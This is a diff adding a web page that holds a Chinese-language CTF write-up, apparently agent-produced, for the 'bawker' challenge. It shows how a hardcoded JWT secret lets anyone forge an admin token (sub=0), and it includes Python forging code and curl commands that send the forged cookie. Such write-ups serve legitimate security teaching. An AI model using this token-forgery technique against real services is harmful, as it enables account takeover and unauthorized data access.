@@ -1,0 +1,560 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://gggongyizhen.github.io/AgentWP/Blue%20Hens%20CTF%202026/bawker/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>bawker - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#bawker" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              bawker
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        题目信息
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        入口与现象
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        分析过程
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        利用过程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="利用过程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-jwt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 生成伪造 JWT
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 带上 Cookie 访问站点
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 本地复现结果
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        关键 payload / 命令
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="bawker">bawker</h1>
+<h2 id="_1">题目信息</h2>
+<ul>
+<li>类型：Web</li>
+<li>题目状态：已定位完整利用链，远端实例需手动创建</li>
+<li>目标：<code>http://cdeployer1.2485370.xyz:8080/</code></li>
+<li>核心漏洞：硬编码 JWT 密钥导致可伪造 <code>admin</code> 身份</li>
+</ul>
+<h2 id="_2">入口与现象</h2>
+<p>题目附件是一个 FastAPI 写的类 Twitter 站点。先看源码能很快锁定几个关键事实：</p>
+<ol>
+<li>认证 Cookie 名固定为 <code>bawker_token</code>。</li>
+<li>JWT 密钥写死在源码里，是 <code>fake_secret_key_for_testing_purposes_only</code>。</li>
+<li>后端把 JWT 的 <code>sub</code> 直接当用户 ID 使用。</li>
+<li>数据库启动时会强制创建 <code>id=0</code> 的 <code>admin</code> 私密用户，并插入一条私密 bawk，内容里直接带 flag。</li>
+</ol>
+<p>对应代码位置：</p>
+<pre><code class="language-python"># app/config.py
+AUTH_COOKIE_NAME = &quot;bawker_token&quot;
+JWT_SECRET_KEY = &quot;fake_secret_key_for_testing_purposes_only&quot;
+FLAG_VALUE = &quot;CTF{fake_flag_for_testing_purposes_only}&quot;
+</code></pre>
+<pre><code class="language-python"># app/security.py
+payload = {&quot;sub&quot;: subject, &quot;exp&quot;: expire_at}
+...
+payload = jwt.decode(token, settings.jwt_secret_key, algorithms=[JWT_ALGORITHM])
+subject = payload.get(&quot;sub&quot;)
+</code></pre>
+<pre><code class="language-python"># app/db.py
+admin = User(
+    id=0,
+    username=&quot;admin&quot;,
+    ...
+    is_private=True,
+)
+
+flag_post_content = f&quot;Hello, the flag is: {FLAG_VALUE}&quot;
+flag_post = Bawk(
+    author_id=0,
+    content=flag_post_content,
+    is_private=True,
+)
+</code></pre>
+<p>这意味着只要能用已知密钥签一个 <code>sub=0</code> 的 JWT，后端就会把我们当成 <code>admin</code>。</p>
+<h2 id="_3">分析过程</h2>
+<p>整个认证流程非常直接：</p>
+<ol>
+<li>登录成功后，服务端调用 <code>create_access_token(str(user.id))</code>。</li>
+<li>这个 token 被写进 <code>bawker_token</code> Cookie。</li>
+<li>后续请求里，<code>get_current_user_optional()</code> 会从 Cookie 读出 token。</li>
+<li><code>decode_access_token()</code> 只验证签名和 <code>exp</code>，然后取出 <code>sub</code>。</li>
+<li><code>sub</code> 被转成整数后直接 <code>session.get(User, user_id)</code>。</li>
+</ol>
+<p>也就是说，后端没有做任何额外的服务端会话校验，也没有限制 <code>sub</code> 不能是 <code>0</code>。而 <code>admin</code> 用户恰好又是固定 <code>id=0</code>。</p>
+<p>这题的利用链因此非常短：</p>
+<ol>
+<li>用源码里的固定密钥签 JWT。</li>
+<li>把 <code>sub</code> 设为 <code>"0"</code>。</li>
+<li>将生成的 token 放进 <code>bawker_token</code> Cookie。</li>
+<li>访问首页 <code>/</code>，即可看到 <code>admin</code> 的私密 bawk，也就是 flag。</li>
+</ol>
+<h2 id="_4">利用过程</h2>
+<h3 id="1-jwt">1. 生成伪造 JWT</h3>
+<pre><code class="language-python">import jwt
+from datetime import datetime, timedelta, timezone
+
+token = jwt.encode(
+    {
+        &quot;sub&quot;: &quot;0&quot;,
+        &quot;exp&quot;: datetime.now(timezone.utc) + timedelta(minutes=90),
+    },
+    &quot;fake_secret_key_for_testing_purposes_only&quot;,
+    algorithm=&quot;HS256&quot;,
+)
+
+print(token)
+</code></pre>
+<h3 id="2-cookie">2. 带上 Cookie 访问站点</h3>
+<p>如果已经拿到实际实例地址，直接把 token 放到 <code>bawker_token</code> 里访问即可：</p>
+<pre><code class="language-bash">curl -b &quot;bawker_token=REPLACE_WITH_TOKEN&quot; http://INSTANCE_HOST/
+curl -b &quot;bawker_token=REPLACE_WITH_TOKEN&quot; http://INSTANCE_HOST/api/auth/me
+</code></pre>
+<p><code>/api/auth/me</code> 会直接确认当前身份是不是 <code>admin</code>。</p>
+<h3 id="3">3. 本地复现结果</h3>
+<p>我根据附件在本地做了完整复现，结果如下：</p>
+<pre><code class="language-text">feed_anon 200 contains_flag False
+register 303 set_cookie True
+me_after_register 200 {'authenticated': True, 'user': {'id': 1, 'username': 'attacker', ...}}
+me_admin 200 {'authenticated': True, 'user': {'id': 0, 'username': 'admin', ...}}
+feed_admin 200 contains_flag True
+Hello, the flag is: CTF{fake_flag_for_testing_purposes_only}
+</code></pre>
+<p>这说明利用链是完整可用的，不是停留在静态猜测。</p>
+<h2 id="payload">关键 payload / 命令</h2>
+<pre><code class="language-text">Cookie: bawker_token=&lt;HS256({&quot;sub&quot;:&quot;0&quot;,&quot;exp&quot;:...}, &quot;fake_secret_key_for_testing_purposes_only&quot;)&gt;
+</code></pre>
+<p>生成 token：</p>
+<pre><code class="language-python">import jwt
+from datetime import datetime, timedelta, timezone
+
+print(jwt.encode(
+    {&quot;sub&quot;: &quot;0&quot;, &quot;exp&quot;: datetime.now(timezone.utc) + timedelta(minutes=90)},
+    &quot;fake_secret_key_for_testing_purposes_only&quot;,
+    algorithm=&quot;HS256&quot;,
+))
+</code></pre>
+<p>验证身份：</p>
+<pre><code class="language-bash">curl -b &quot;bawker_token=REPLACE_WITH_TOKEN&quot; http://INSTANCE_HOST/api/auth/me
+</code></pre>
+<p>读取首页私密 bawk：</p>
+<pre><code class="language-bash">curl -b &quot;bawker_token=REPLACE_WITH_TOKEN&quot; http://INSTANCE_HOST/
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code class="language-text">附件内占位 flag：CTF{fake_flag_for_testing_purposes_only}
+</code></pre>
+<p>2026-04-18 实测时，题目给出的地址实际上是一个 Challenge Instancer 首页，不是已经启动好的 <code>bawker</code> 实例，而且创建实例前需要通过 Cloudflare Turnstile。未带 Turnstile 参数直接提交会返回：</p>
+<pre><code class="language-text">Turnstile verification failed. Are you a bot?
+</code></pre>
+<p>所以自动化分析阶段没法直接取到远端真实 flag，但真实实例一旦创建出来，利用方式不会变化，直接把上面的 JWT 塞进 <code>bawker_token</code> 即可。</p>
+<h2 id="_5">总结</h2>
+<p>这题本质上是一个非常直接的 JWT 伪造题：</p>
+<ul>
+<li>JWT 密钥硬编码在源码里。</li>
+<li>JWT 的 <code>sub</code> 被直接信任为用户 ID。</li>
+<li><code>admin</code> 用户固定是 <code>id=0</code>。</li>
+<li>flag 就放在 <code>admin</code> 的私密 bawk 里。</li>
+</ul>
+<p>因此不需要爆破密码、不需要关注私密账号关注逻辑，直接伪造 <code>sub=0</code> 的 token 就结束了。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
